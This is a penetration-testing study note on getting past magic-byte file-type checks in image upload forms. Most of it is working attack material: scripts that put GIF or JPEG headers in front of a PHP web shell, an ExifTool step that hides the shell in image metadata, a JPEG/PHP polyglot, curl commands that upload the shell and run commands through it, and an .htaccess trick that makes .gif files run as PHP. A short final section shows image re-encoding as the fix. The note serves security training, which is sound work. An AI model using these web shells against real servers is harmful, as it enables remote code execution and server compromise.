---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.12 Image Upload Magic Bytes Bypass"
portswigger_labs: ["Web shell upload via obfuscated file extension"]
---

# 22.12 — Image Upload Magic Bytes Bypass

## What Are Magic Bytes?

```
MAGIC BYTES:
  Files start with specific byte sequences that identify their type
  More reliable than file extension!
  
  FILE COMMAND: reads magic bytes to determine type
  file shell.php → "PHP script text"
  file image.jpg → "JPEG image data, JFIF standard 1.01"
  
  COMMON MAGIC BYTES:
  JPEG: FF D8 FF E0  (or FF D8 FF E1, FF D8 FF E8)
  PNG:  89 50 4E 47 0D 0A 1A 0A  (= .PNG\r\n)
  GIF:  47 49 46 38 37 61 (= GIF87a)  OR
        47 49 46 38 39 61 (= GIF89a)
  PDF:  25 50 44 46 2D (= %PDF-)
  ZIP:  50 4B 03 04 (= PK..)
  
  SERVER-SIDE CHECK:
  Some apps use finfo_file() (PHP) or python-magic to check magic bytes
  instead of trusting the Content-Type header or extension!
  
  BYPASS:
  Prepend magic bytes of the expected file type to PHP webshell content!
  → Magic bytes check passes (looks like JPEG)
  → PHP interpreter ignores leading bytes → finds <?php → executes!
```

---

## Creating Files with Fake Magic Bytes

```bash
# METHOD 1: PREPEND MAGIC BYTES IN PYTHON:
python3 << 'EOF'
# Create a file that starts with JPEG magic bytes but contains PHP:
jpeg_magic = b'\xff\xd8\xff\xe0'
php_payload = b'<?php system($_GET["cmd"]); ?>'

with open('magic_bypass.php', 'wb') as f:
    f.write(jpeg_magic + php_payload)

print("Created magic_bypass.php")
EOF

# Verify:
file magic_bypass.php
# → "JPEG image data" (magic bytes say JPEG!)

# METHOD 2: PREPEND GIF HEADER:
python3 -c "
with open('shell.php', 'wb') as f:
    f.write(b'GIF89a')  # GIF magic bytes
    f.write(b'\n<?php system(\$_GET[\"cmd\"]); ?>')
"

# Method 3: ExifTool to embed PHP in image metadata:
# Install: apt install exiftool
# Take a real JPEG:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real_image.jpg -o shell.jpg
# → real_image.jpg content preserved
# → PHP code embedded in EXIF comment field!
# If server passes EXIF data through or renders it unsafely → RCE!

# METHOD 4: INJECT PHP INTO REAL IMAGE (polyglot):
# Create a file that is BOTH a valid JPEG AND valid PHP:
python3 << 'EOF'
with open('real_image.jpg', 'rb') as f:
    jpeg_data = f.read()

# Find end of JPEG (FF D9) or just append after:
# PHP tags can appear anywhere in a PHP file:
php_payload = b'\n<?php system($_GET["cmd"]); ?>'

# Create polyglot (JPEG + PHP):
with open('polyglot.php.jpg', 'wb') as f:
    # Write real JPEG data:
    f.write(jpeg_data)
    # Append PHP code after JPEG data:
    f.write(php_payload)
EOF

# This file:
# - Passes as valid JPEG (magic bytes + JPEG structure)
# - If executed as PHP: PHP finds <?php tag and executes!
```

---

## Testing Magic Bytes Bypass

```bash
# STEP 1: CREATE BYPASS FILE:
python3 << 'EOF'
# JPEG magic + PHP webshell:
with open('bypass.php', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG magic
    f.write(b'<?php system($_GET["cmd"]); ?>')
EOF

# STEP 2: UPLOAD WITH VARIOUS FILENAMES:
# With .php extension (hope magic bytes fool content check):
curl -X POST https://target.com/upload \
  -b "session=SESSION" \
  -F "file=@bypass.php;type=image/jpeg"

# With .jpg extension (hope server executes .jpg as PHP):
cp bypass.php bypass.jpg
curl -X POST https://target.com/upload \
  -b "session=SESSION" \
  -F "file=@bypass.jpg;type=image/jpeg"

# STEP 3: TEST EXECUTION:
# If uploaded as .php:
curl "https://target.com/uploads/bypass.php?cmd=id"

# If uploaded as .jpg but server misconfigured:
curl "https://target.com/uploads/bypass.jpg?cmd=id"

# STEP 4: GIF APPROACH (often bypasses):
python3 -c "
with open('shell.gif', 'wb') as f:
    f.write(b'GIF89a')
    f.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
"

curl -X POST https://target.com/upload \
  -b "session=SESSION" \
  -F "file=@shell.gif;type=image/gif;filename=shell.gif"

# TEST: filename=shell.php (but content is GIF-magic + PHP)
curl -X POST https://target.com/upload \
  -b "session=SESSION" \
  -F "file=@shell.gif;type=image/gif;filename=shell.php"
# → Does it accept? → What name is it saved under?
```

---

## GIF89a Trick (Classic)

```
GIF89a<?php system($_GET['cmd']); ?>

WHY GIF89a WORKS WELL:
  GIF header is printable ASCII characters!
  "GIF89a" = 0x47 0x49 0x46 0x38 0x39 0x61
  
  PHP processes: GIF89a is output as-is (no error)
  Then encounters: <?php system($_GET['cmd']); ?>
  → Executes the PHP!
  → The "GIF89a" prefix is just printed to browser (invisible)
  
  TEST DIRECTLY:
  echo "GIF89a<?php system(\$_GET['cmd']); ?>" > gif_shell.php
  php gif_shell.php → should try to execute (test locally)
  
  UPLOAD GIF THEN RENAME:
  Upload: gif_shell.gif (Content-Type: image/gif)
  → App saves as: gif_shell.gif
  → Include .htaccess: AddType application/x-httpd-php .gif
  → Now gif_shell.gif executes as PHP!
```

---

## Fix

```
PROPER CONTENT VALIDATION:

LEVEL 1 (Client Content-Type) → Bypassed by changing header
LEVEL 2 (File Extension) → Bypassed by alternative extensions
LEVEL 3 (Magic Bytes) → Bypassed by prepending magic bytes to PHP!

LEVEL 4 (CORRECT): Parse file using proper library:

# Python — use Pillow for images:
from PIL import Image
import io

def validate_image(file_data):
    try:
        img = Image.open(io.BytesIO(file_data))
        img.verify()  # Verify it's a valid image
        # Must re-open after verify:
        img = Image.open(io.BytesIO(file_data))
        # Re-save to strip any embedded code:
        output = io.BytesIO()
        img.save(output, format='JPEG')  # Re-save as JPEG
        return output.getvalue()
    except Exception:
        raise ValueError("Not a valid image")

# PHP — use GD or Imagick:
# Imagick:
try {
    $imagick = new Imagick($tmp_path);
    // If no exception → valid image
    // Re-save to strip potential PHP:
    $imagick->writeImage($safe_output_path);
} catch (ImagickException $e) {
    die("Invalid image");
}

# GD:
$image = @imagecreatefromjpeg($tmp_path);  // @ suppresses errors
if (!$image) {
    die("Invalid JPEG image");
}
// Re-save:
imagejpeg($image, $safe_output_path, 85);
imagedestroy($image);

WHY RE-SAVING WORKS:
  PHP code embedded in image → re-saving regenerates pixel data
  → PHP code stripped during image regeneration
  → Output file is "clean" image with no PHP code!
```

---

## Related Notes
- [[03 - Content-Type Bypass]] — MIME type bypass
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — extension bypass
- [[05 - Double Extension (file.php.jpg)]] — double extension
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
